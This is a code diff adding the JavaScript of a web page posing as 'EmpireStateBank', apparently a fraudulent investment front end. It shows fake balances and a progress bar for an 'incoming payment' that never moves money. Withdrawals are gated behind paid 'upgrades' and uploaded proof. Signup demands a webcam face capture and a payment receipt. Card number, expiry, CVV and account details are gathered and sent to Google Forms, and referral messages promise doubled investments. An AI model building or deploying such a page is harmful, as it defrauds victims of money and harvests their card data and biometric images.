+      const today = new Date().toDateString();
+      const lastNotificationDate = localStorage.getItem('lastNotificationDate');
+      if (lastNotificationDate !== today) {
+        localStorage.setItem('lastNotificationDate', today);
+        return 1;
+      }
+      return 0;
+    }
+
+    function updateNotificationBadge() {
+      const count = getNotificationCount();
+      const badge = $("notificationBadge");
+      if (count > 0) {
+        badge.textContent = count;
+        badge.style.display = "flex";
+      } else {
+        badge.style.display = "none";
+      }
+    }
+
+    function showDashboard(user) {
+      currentUser = user;
+
+      $("loginPage").classList.add("hidden");
+      $("dashboardPage").classList.remove("hidden");
+      $("proofPage").classList.remove("active");
+      $("profilePage").classList.remove("active");
+      $("referralPage").classList.remove("active");
+
+      $("userFirstName").textContent = user.name.split(" ")[0].toUpperCase();
+      $("userImage").src = user.profileImage;
+      $("tierBadge").textContent = user.tier;
+
+      $("walletBalance1").textContent = "$" + user.currentBalance.toFixed(2);
+      $("balanceDisplay").textContent = "*** **";
+      balanceRevealed = false;
+      $("cardNumber1").textContent = "**" + user.cardNumber.slice(-4);
+      $("cardNumber2").textContent = "**" + user.cardNumber.slice(-4);
+
+      $("paymentDate").textContent =
+        new Date(user.incomingPaymentDate).toISOString().slice(0, 16).replace("T", " ") + " UTC";
+
+      updateProgress();
+      clearInterval(progressTimer);
+      progressTimer = setInterval(updateProgress, 1000);
+
+      setupWalletSlider();
+      updateNotificationBadge();
+    }
+
+    function updateProgress() {
+      if (!currentUser) return;
+
+      const start = new Date(currentUser.incomingPaymentStartDate).getTime();
+      const end = new Date(currentUser.incomingPaymentDate).getTime();
+      const now = Date.now();
+
+      if (now >= end) {
+        $("incomingSection").style.display = "none";
+        $("walletBalance1").textContent = "$" + currentUser.incomingPayment.toFixed(2);
+      } else {
+        $("incomingSection").style.display = "block";
+        const percent = Math.min(100, Math.max(0, ((now - start) / (end - start)) * 100));
+        $("paymentProgress").style.width = percent + "%";
+        $("paymentPercent").textContent = Math.round(percent) + "%";
+      }
+    }
+
+    // Wallet Slider
+    function setupWalletSlider() {
+      const slider = $("walletSlider");
+      const wrapper = $("walletSliderWrapper");
+
+      let isDragging = false;
+
+      wrapper.addEventListener("mousedown", (e) => {
+        isDragging = true;
+        startX = e.clientX;
+        slider.classList.add("grabbing");
+      });
+
+      wrapper.addEventListener("touchstart", (e) => {
+        isDragging = true;
+        startX = e.touches[0].clientX;
+      });
+
+      wrapper.addEventListener("mousemove", (e) => {
+        if (!isDragging) return;
+        const diff = e.clientX - startX;
+        currentTranslate = diff;
+        slider.style.transform = `translateX(${diff}px)`;
+      });
+
+      wrapper.addEventListener("touchmove", (e) => {
+        if (!isDragging) return;
+        const diff = e.touches[0].clientX - startX;
+        currentTranslate = diff;
+        slider.style.transform = `translateX(${diff}px)`;
+      });
+
+      wrapper.addEventListener("mouseup", () => {
+        isDragging = false;
+        slider.classList.remove("grabbing");
+        handleSliderEnd();
+      });
+
+      wrapper.addEventListener("touchend", () => {
+        isDragging = false;
+        handleSliderEnd();
+      });
+
+      wrapper.addEventListener("mouseleave", () => {
+        if (isDragging) {
+          isDragging = false;
+          slider.classList.remove("grabbing");
+          handleSliderEnd();
+        }
+      });
+
+      function handleSliderEnd() {
+        const threshold = 50;
+        if (currentTranslate < -threshold) {
+          slider.style.transform = "translateX(-100%)";
+          currentWalletIndex = 1;
+        } else if (currentTranslate > threshold) {
+          slider.style.transform = "translateX(0)";
+          currentWalletIndex = 0;
+        } else {
+          if (Math.abs(currentTranslate) > wrapper.offsetWidth / 4) {
+            slider.style.transform = currentTranslate < 0 ? "translateX(-100%)" : "translateX(0)";
+            currentWalletIndex = currentTranslate < 0 ? 1 : 0;
+          } else {
+            slider.style.transform = currentTranslate < -50 ? "translateX(-100%)" : "translateX(0)";
+            currentWalletIndex = currentTranslate < -50 ? 1 : 0;
+          }
+        }
+        slider.style.transition = "transform 0.3s ease";
+        updateIndicators();
+        setTimeout(() => {
+          slider.style.transition = "";
+        }, 300);
+      }
+    }
+
+    // Update Indicators
+    function updateIndicators() {
+      const indicators = document.querySelectorAll('.indicator');
+      indicators.forEach((indicator, index) => {
+        if (index === currentWalletIndex) {
+          indicator.classList.add('active');
+        } else {
+          indicator.classList.remove('active');
+        }
+      });
+    }
+
+    // Indicator Click
+    document.querySelectorAll('.indicator').forEach((indicator, index) => {
+      indicator.addEventListener('click', () => {
+        const slider = $("walletSlider");
+        if (index === 0) {
+          slider.style.transform = "translateX(0)";
+        } else {
+          slider.style.transform = "translateX(-100%)";
+        }
+        currentWalletIndex = index;
+        updateIndicators();
+      });
+    });
+
+    // Customer Service
+    $("customerServiceBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "mailto:empirevirtual99@gmail.com";
+      }, 1500);
+    });
+
+    // Notification
+    $("notificationBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://whatsapp.com/channel/0029VbAjCE67oQhZxHe5Kq3R";
+      }, 1500);
+    });
+
+    // Fund
+    $("fundBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSd67qB5MQ6YprIk5qG1jvyPzv8ChveVtkIn9A1PUTRhOnvzxQ/viewform";
+      }, 1500);
+    });
+
+    // Convert Card
+    $("convertCardBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        
+        if (isCardExpired(currentUser.cardExpiry)) {
+          showAlert("E-wallet Card Expired", "Your E-wallet card has expired. Please update your card to continue.", () => {
+            showLoading();
+            setTimeout(() => {
+              hideLoading();
+              window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSd_-p0ZCSPgn7m2nKKD9RIdTBLoWU2roeQOD0FrifSx52B7NQ/viewform";
+            }, 1500);
+          });
+          return;
+        }
+
+        populateConvertModal();
+        openModal("convertModal");
+      }, 1500);
+    });
+
+    // Withdraw Card
+    $("withdrawCardBtn").addEventListener("click", () => {
+      showPinModal(() => {
+        const pinInput = $("pinInputField").value;
+        if (pinInput === currentUser.id) {
+          closePinModal();
+          showLoading();
+          setTimeout(() => {
+            hideLoading();
+            
+            if (currentUser.tier === 2) {
+              showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
+                showLoading();
+                setTimeout(() => {
+                  hideLoading();
+                  showProofPage();
+                }, 1500);
+              });
+              return;
+            }
+
+            window.location.href = "https://www.quickteller.com/transfer-money/account";
+          }, 1500);
+        } else {
+          showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+          closePinModal();
+        }
+      });
+    });
+
+    // Toggle Balance
+    $("toggleBalanceBtn").addEventListener("click", () => {
+      showPinModal(() => {
+        const pinInput = $("pinInputField").value;
+        if (pinInput === currentUser.id) {
+          closePinModal();
+          showLoading();
+          setTimeout(() => {
+            hideLoading();
+            window.location.href = "https://www.quickteller.com/dashboard/ecash/history";
+          }, 1500);
+        } else {
+          showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+          closePinModal();
+        }
+      });
+    });
+
+    // PIN Confirm
+    $("pinConfirmBtn").addEventListener("click", () => {
+      if (pinModalCallback) {
+        pinModalCallback();
+      }
+    });
+
+    // PIN Cancel
+    $("pinCancelBtn").addEventListener("click", () => {
+      closePinModal();
+    });
+
+    // Convert Amount
+    $("convertAmountInput").addEventListener("input", (e) => {
+      const usdAmount = parseFloat(e.target.value) || 0;
+      const ngnAmount = usdAmount * EXCHANGE_RATE;
+
+      $("convertAmountDisplay").textContent = "₦" + ngnAmount.toFixed(2);
+      $("convertBtnText").textContent = "Convert $" + usdAmount.toFixed(2);
+    });
+
+    // Convert Menu
+    $("convertMenuBtn").addEventListener("click", () => {
+      const now = new Date();
+
+      if (now.getUTCDay() !== 1 || now.getUTCHours() < 8 || now.getUTCHours() >= 11) {
+        alert("Convert to Naira is available on Mondays from 08:00 to 11:00 UTC.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        
+        if (isCardExpired(currentUser.cardExpiry)) {
+          showAlert("E-wallet Card Expired", "Your E-wallet card has expired. Please update your card to continue.", () => {
+            showLoading();
+            setTimeout(() => {
+              hideLoading();
+              window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSd_-p0ZCSPgn7m2nKKD9RIdTBLoWU2roeQOD0FrifSx52B7NQ/viewform";
+            }, 1500);
+          });
+          return;
+        }
+
+        populateConvertModal();
+        openModal("convertModal");
+      }, 1500);
+    });
+
+    function populateConvertModal() {
+      $("transferTag").textContent = currentUser.tag;
+      $("expiryDisplay").value = currentUser.cardExpiry;
+      $("cvvDisplay").value = currentUser.cvv;
+      $("cardNumberDisplay").textContent = `E-wallet Card (**${currentUser.cardNumber.slice(-4)})`;
+      $("cardNumberHidden").value = `E-wallet Card (**${currentUser.cardNumber.slice(-4)})`;
+      $("fullNameDisplay").value = currentUser.name;
+      $("emailDisplay").value = currentUser.email;
+      $("accountNumberDisplay").value = currentUser.accountNumber;
+    }
+
+    // Convert Submit
+    $("convertForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const pinInput = $("pinInput").value;
+      if (pinInput !== currentUser.id) {
+        showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("convertForm").submit();
+        closeModal("convertModal");
+      }, 1500);
+    });
+
+    // Convert Back
+    $("convertModalBack").addEventListener("click", () => {
+      closeModal("convertModal");
+    });
+
+    // Investment Modal
+    function populateInvestmentModal() {
+      $("investCardDisplay").textContent = `E-wallet Card (**${currentUser.cardNumber.slice(-4)})`;
+      $("investFullName").value = currentUser.name;
+      $("investDateInput").valueAsDate = new Date();
+    }
+
+    // Investment Back
+    $("investmentModalBack").addEventListener("click", () => {
+      closeModal("investmentModal");
+    });
+
+    // Investment Submit
+    $("investmentForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const pinInput = $("investPinInput").value;
+      if (pinInput !== currentUser.id) {
+        showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("investmentForm").submit();
+        closeModal("investmentModal");
+      }, 1500);
+    });
+
+    // Betting
+    $("bettingButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://empirestatebank.github.io/EmpireStateBank---Sports-Prediction/";
+      }, 1500);
+    });
+
+    // TV
+    $("tvButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        openModal("tvModal");
+      }, 1500);
+    });
+
+    // Channel 1
+    $("channel1Btn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        closeModal("tvModal");
+        window.location.href = "https://sportytv.com";
+      }, 1500);
+    });
+
+    // Channel 2
+    $("channel2Btn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        closeModal("tvModal");
+        window.location.href = "https://www.camel1.tv/";
+      }, 1500);
+    });
+
+    // Close TV
+    $("tvCloseBtn").addEventListener("click", () => {
+      closeModal("tvModal");
+    });
+
+    // Referral Page
+    function showReferralPage() {
+      $("dashboardPage").classList.add("hidden");
+      $("referralPage").classList.add("active");
+      $("profilePage").classList.remove("active");
+      $("proofPage").classList.remove("active");
+
+      $("referralCodeDisplay").textContent = currentUser.tag;
+      $("referralLinkDisplay").textContent = "https://empirestatebank.mssg.me";
+    }
+
+    // Close Referral
+    $("referralCloseBtn").addEventListener("click", () => {
+      $("referralPage").classList.remove("active");
+      $("dashboardPage").classList.remove("hidden");
+    });
+
+    // Copy Code
+    $("copyCodeBtn").addEventListener("click", () => {
+      const code = $("referralCodeDisplay").textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        showAlert("Success", "Referral code copied to clipboard!");
+      });
+    });
+
+    // Copy Link
+    $("copyLinkBtn").addEventListener("click", () => {
+      const link = $("referralLinkDisplay").textContent;
+      navigator.clipboard.writeText(link).then(() => {
+        showAlert("Success", "Referral link copied to clipboard!");
+      });
+    });
+
+    // Share Link
+    $("shareLinkBtn").addEventListener("click", () => {
+      const link = $("referralLinkDisplay").textContent;
+      const tag = $("referralCodeDisplay").textContent;
+      const message = `Invest what EmpireStateBank and get 2x of your investment when you register using my referral code: ${tag}\n${link}`;
+
+      if (navigator.share) {
+        navigator.share({
+          title: "EmpireStateBank Referral",
+          text: message
+        }).catch(err => console.log("Share cancelled"));
+      } else {
+        const whatsappMessage = encodeURIComponent(message);
+        window.location.href = `https://wa.me/?text=${whatsappMessage}`;
+      }
+    });
+
+    // Invitation
+    $("invitationButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        showReferralPage();
+      }, 1500);
+    });
+
+    // Proof Page
+    function showProofPage() {
+      $("dashboardPage").classList.add("hidden");
+      $("proofPage").classList.add("active");
+      $("referralPage").classList.remove("active");
+      $("profilePage").classList.remove("active");
+      $("proofFullName").value = currentUser.name;
+    }
+
+    $("proofBackBtn").addEventListener("click", () => {
+      $("proofPage").classList.remove("active");
+      $("dashboardPage").classList.remove("hidden");
+    });
+
+    // Profile Page
+    function showProfile(user) {
+      currentUser = user;
+      $("dashboardPage").classList.add("hidden");
+      $("profilePage").classList.add("active");
+      $("proofPage").classList.remove("active");
+      $("referralPage").classList.remove("active");
+
+      $("profileImage").src = user.profileImage;
+      $("profileName").textContent = (user.name || "").toUpperCase();
+      $("profileAccountNumber").textContent = user.accountNumber || "";
+      $("profileTierBadge").textContent = "Tier " + (user.tier || "");
+
+      if (user.tier === 2) {
+        $("upgradeBtn").style.display = "inline-block";
+      } else {
+        $("upgradeBtn").style.display = "none";
+      }
+
+      $("profileFullName").textContent = user.name || "";
+      $("profileNickname").textContent = "Empire";
+      $("profileGender").textContent = user.gender || "--";
+      $("profileDob").textContent = user.dob || "--";
+      $("profileEmail").textContent = user.email || "";
+    }
+
+    $("profileBackBtn").addEventListener("click", () => {
+      $("profilePage").classList.remove("active");
+      $("dashboardPage").classList.remove("hidden");
+    });
+
+    $("upgradeBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("profilePage").classList.remove("active");
+        showProofPage();
+      }, 1500);
+    });
+
+    // Proof Upload
+    $("uploadArea").addEventListener("click", () => {
+      $("proofFileInput").click();
+    });
+
+    $("proofFileInput").addEventListener("change", (e) => {
+      if (e.target.files.length > 0) {
+        $("fileName").textContent = "✓ " + e.target.files[0].name;
+      }
+    });
+
+    // Proof Radio
+    document.querySelectorAll('input[name="Account Status"]').forEach(radio => {
+      radio.addEventListener("change", (e) => {
+        if (e.target.value === "I don't have") {
+          $("getAccountBtn").classList.add("show");
+        } else {
+          $("getAccountBtn").classList.remove("show");
+        }
+      });
+    });
+
+    // Get Account
+    $("getAccountBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://play.google.com/store/apps/details?id=com.quickteller.app";
+      }, 1500);
+    });
+
+    // Sample Link
+    $("sampleLink").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "ESB_eCash_Activation_90sec_Corrected_Privacy.mp4";
+      }, 1500);
+    });
+
+    // Proof Submit
+    $("proofForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      if (!$("proofFileInput").files.length) {
+        alert("Please upload a proof document");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("proofForm").submit();
+      }, 1500);
+    });
+
+    // Invest
+    $("investButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        populateInvestmentModal();
+        openModal("investmentModal");
+      }, 1500);
+    });
+
+    // Withdraw
+    $("withdrawButton").addEventListener("click", () => {
+      if (currentUser.tier === 2) {
+        showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
+          showLoading();
+          setTimeout(() => {
+            hideLoading();
+            showProofPage();
+          }, 1500);
+        });
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://www.quickteller.com/transfer-money/account";
+      }, 1500);
+    });
+
+    // CAMERA FUNCTIONS
+    async function startCamera() {
+      try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 400 } }
+        });
+        const video = $("cameraVideo");
+        video.srcObject = mediaStream;
+        video.onloadedmetadata = () => {
+          video.play();
+          openModal("cameraModal");
+        };
+      } catch (error) {
+        console.error('Camera error:', error);
+        showAlert("Camera Error", "Could not access camera. Please allow camera permissions and try again.");
+      }
+    }
+
+    function stopCamera() {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      closeModal("cameraModal");
+    }
+
+    $("openCameraBtn").addEventListener("click", (e) => {
+      e.preventDefault();
+      startCamera();
+    });
+
+    $("captureBtn").addEventListener("click", (e) => {
+      e.preventDefault();
+      const video = $("cameraVideo");
+      const canvas = $("cameraCanvas");
+      const context = canvas.getContext('2d');
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
+      
+      // Convert canvas to blob and create file
+      canvas.toBlob((blob) => {
+        const file = new File([blob], "face_capture.png", { type: "image/png" });
+        
+        // Create a DataTransfer to set files
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        $("faceFileInput").files = dataTransfer.files;
+        
+        faceImageData = canvas.toDataURL('image/png');
+        
+        $("facePreviewImg").src = faceImageData;
+        $("facePreview").style.display = "block";
+        stopCamera();
+        showAlert("Success", "Face captured successfully!");
+      });
+    });
+
+    $("cameraCloseBtn").addEventListener("click", (e) => {
+      e.preventDefault();
+      stopCamera();
+    });
+
+    // Receipt Upload
+    $("receiptUploadArea").addEventListener("click", () => {
+      $("receiptFileInput").click();
+    });
+
+    $("receiptFileInput").addEventListener("change", (e) => {
+      if (e.target.files.length > 0) {
+        $("receiptFileName").textContent = "✓ " + e.target.files[0].name;
+      }
+    });
+
+    // Make Payment
+    $("makePaymentBtn").addEventListener("click", (e) => {
+      e.preventDefault();
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://sparkle.ng/ol/OL_U3SC3DDF";
+      }, 1500);
+    });
+
+    // Signup Submit
+    $("signupForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      if (!$("faceFileInput").files || $("faceFileInput").files.length === 0) {
+        showAlert("Face Capture Required", "Please capture your face before registering.");
+        return;
+      }
+
+      if (!$("receiptFileInput").files || $("receiptFileInput").files.length === 0) {
+        showAlert("Receipt Required", "Please upload your payment receipt.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("signupForm").submit();
+      }, 1500);
+    });
+
+    // Login Submit
+    $("loginForm").addEventListener("submit", (event) => {
+      event.preventDefault();
+
+      const email = $("loginEmail").value.trim();
+      const password = $("loginPassword").value;
+
+      const user = USERS.find(
+        (item) => item.email === email && item.password === password
+      );
+
+      if (!user) {
+        showAlert("Login Failed", "Invalid email or password. Please try again.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        showDashboard(user);
+      }, 1500);
+    });
+
+    // Signup Link
+    $("signupLink").addEventListener("click", (event) => {
+      event.preventDefault();
+      faceImageData = null;
+      $("faceFileInput").value = "";
+      $("facePreview").style.display = "none";
+      $("receiptFileName").textContent = "";
+      $("receiptFileInput").value = "";
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        openModal("signupModal");
+      }, 1000);
+    });
+
+    // Profile Shortcut
+    $("profileShortcut").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        if (currentUser) {
+          showProfile(currentUser);
+        } else {
+          showAlert("Error", "No user is currently logged in.");
+        }
+      }, 1500);
+    });
+
+    // Me Button
+    $("meButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        if (currentUser) {
+          showProfile(currentUser);
+        } else {
+          showAlert("Error", "No user is currently logged in.");
+        }
+      }, 1500);
+    });
+
+    // Initialize
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        $("coverPage").classList.add("hidden");
+        $("loginPage").classList.remove("hidden");
+      }, 6000);
+    });
+  </script>
 </body>
 </html>
